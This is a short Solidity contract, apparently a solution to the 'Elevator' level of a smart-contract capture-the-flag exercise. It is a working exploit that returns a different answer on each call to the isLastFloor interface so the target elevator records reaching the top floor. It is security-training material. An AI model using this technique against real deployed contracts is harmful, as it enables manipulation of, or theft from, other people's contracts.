// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building, Elevator} from "../levels/Elevator.sol";

contract ElevatorAttack is Building {
    uint256 lastFloor;

    function isLastFloor(uint256 floor) external returns (bool) {
        bool result = floor == lastFloor;
        lastFloor = floor;
        return result;
    }

    function attack(address elevatorAddress) public {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(10);
    }
}
